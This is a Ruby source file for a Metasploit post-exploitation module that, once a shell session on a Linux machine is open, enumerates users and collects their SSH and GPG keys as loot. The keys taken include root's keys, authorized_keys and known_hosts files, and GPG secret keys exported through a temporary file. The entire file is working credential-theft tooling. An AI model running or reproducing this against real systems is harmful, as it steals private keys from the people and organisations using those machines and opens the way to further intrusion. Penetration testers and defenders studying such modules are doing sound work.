##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather SSH/GPG Keys',
        'Description'   => %q{
          This module gathers all the public and private keys
          from .ssh and .gnupg user folders. It also gathers
          known_host and autherized_keys from the .ssh folder.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Jedediah Rodriguez <Jedi.rodriguez[at]gmail.com>' #MrXors
          ],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ 'shell' ]
      ))

    register_options(
      [
        OptEnum.new('KEYS', [true, 'Select which type of key you would like to get.', 'GPG', ['GPG','SSH', 'ALL']])
      ], self.class)

  end

  def run
    print_status("Enumerating Users on remote System!")
    list_one = user_list
    if is_root?
      case datastore['KEYS']
      when /GPG/i
        gnupg_root
      when /SSH/i
        ssh_root
      when /ALL/i
        gnupg_root
        ssh_root
      end
    end
    list_one.each do |user|
      case datastore['KEYS']
      when /GPG/i
        gnupg("#{user}")
      when /SSH/i
          ssh("#{user}")
      when /ALL/i
          ssh("#{user}")
          gnupg("#{user}")
      end
    end
  end

  def user_list
    meh_list = []
    single_user = get_users()
    single_user.each do |users|
      meh_list << users[:name]
    end
    return meh_list
  end

  def gnupg(user)
    if exist?("/home/#{user}/.gnupg")
      cmd_exec("/usr/bin/gpg --armor --export-secret-keys > /tmp/tmp.key")
      gpg_key = read_file("/tmp/tmp.key")
      remove_data = file_rm("/tmp/tmp.key")
      p1 = store_loot("gpg.key", "text/plain", session, gpg_key, "gpg.key", "GPG Private Key.")
      print_good("#{user} gpg key file saved in: #{p1.to_s}")
    end
  end

  def gnupg_root
    if exist?("/root/.gnupg")
      cmd_exec("/usr/bin/gpg --armor --export-secret-keys > /tmp/tmp.key")
      gpg_key = read_file("/tmp/tmp.key")
      remove_data = file_rm("/tmp/tmp.key")
      p1 = store_loot("gpg.key", "text/plain", session, gpg_key, "gpg.key", "GPG Root Private Key.")
      print_good("root gpg key file saved in: #{p1.to_s}")
    end
  end

  def ssh(user)
    ssh_files = cmd_exec("/bin/ls /home/#{user}/.ssh/")
    ssh_files.each_line do |read_ssh|
      file_line = "#{read_ssh}"
      regex = /[^\s][a-z]\S[a-z]*\S[a-z]*/.match("#{file_line}")
      if exist?("/home/#{user}/.ssh/#{regex}")
        type_tag = ""
        if "#{regex}" == "authorized_keys"
          type_tag = "authorized_keys"
        elsif "#{regex}" == "known_host"
          type_tag = "known_host"
        elsif "#{regex}" == "id_rsa.pub"
          type_tag = "id_rsa.pub"
        end
        normal_ssh_user = read_file("/home/#{user}/.ssh/#{regex}")
        normal_ssh_user.each_line do |line|
          rsa_file = /RSA/.match("#{line}")
          dsa_file = /DSA/.match("#{line}")
          private_file = /PRIVATE/.match("#{line}")
          if "#{private_file}" == "PRIVATE"
            if "#{rsa_file}" == "RSA"
              type_tag = "rsa.private"
            elsif "#{dsa_file}" == "DSA"
              type_tag = "dsa.private"
            end

          end

        end

      s1 = store_loot("#{type_tag}.key", "text/plain", session, normal_ssh_user, "ssh.loot", "SSH #{type_tag} Key File.")
      print_good("#{user} ssh key file saved in: #{s1.to_s}")
      end

    end

  end

  def ssh_root
    ssh_files = cmd_exec("/bin/ls /root/.ssh/")
    ssh_files.each_line do |read_ssh|
      file_line = "#{read_ssh}"
      regex = /[^\s][a-z]\S[a-z]*\S[a-z]*/.match("#{file_line}")
      if exist?("/root/.ssh/#{regex}")
        type_tag = ""
        if "#{regex}" == "authorized_keys"
          type_tag = "authorized_keys"
        elsif "#{regex}" == "known_host"
          type_tag = "known_host"
        elsif "#{regex}" == "id_rsa.pub"
          type_tag = "id_rsa.pub"
        end
        root_ssh = read_file("/root/.ssh/#{regex}")
        root_ssh.each_line do |line|
          rsa_file = /RSA/.match("#{line}")
          dsa_file = /DSA/.match("#{line}")
          private_file = /PRIVATE/.match("#{line}")
          if "#{private_file}" == "PRIVATE"
            if "#{rsa_file}" == "RSA"
              type_tag = "rsa.private"
            elsif "#{dsa_file}" == "DSA"
              type_tag = "dsa.private"
            end

          end

        end

      s2 = store_loot("#{type_tag}.key", "text/plain", session, root_ssh, "ssh.loot", "SSH #{type_tag} Key File.")
      print_good("root ssh key file saved in: #{s2.to_s}")
      end

    end

  end

end

